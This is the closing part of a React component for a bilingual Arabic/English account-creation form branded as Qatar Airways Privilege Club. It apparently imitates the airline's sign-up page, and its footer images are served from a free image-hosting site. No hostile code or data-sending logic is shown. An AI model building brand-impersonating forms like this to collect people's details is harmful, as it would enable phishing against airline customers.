                  ? "أوافق على شروط وأحكام نادي الامتياز وأتفهم أنه سيتم التعامل مع معلوماتي وفقاً لبيان خصوصية الخطوط الجوية القطرية." 
                  : "I agree to the Privilege Club Terms and Conditions and understand that my information will be handled in accordance with the Qatar Airways Privacy Notice."}
              </label>
            </div>
          </div>

          <button type="submit" className="submit-btn">
            {isArabic ? "إنشاء حساب" : "Create Account"}
          </button>
        </form>

        <div className="mt-12 pt-8 border-t border-gray-100 flex justify-center">
          <img 
            src={isArabic ? "https://i.ibb.co/23sMQkSF/IMG-20260714-WA0015.jpg" : "https://i.ibb.co/609jMvhx/IMG-20260714-WA0016.jpg"} 
            className="w-full max-w-[500px] rounded-lg" 
            alt="Footer" 
          />
        </div>
      </div>
    </div>
  );
}
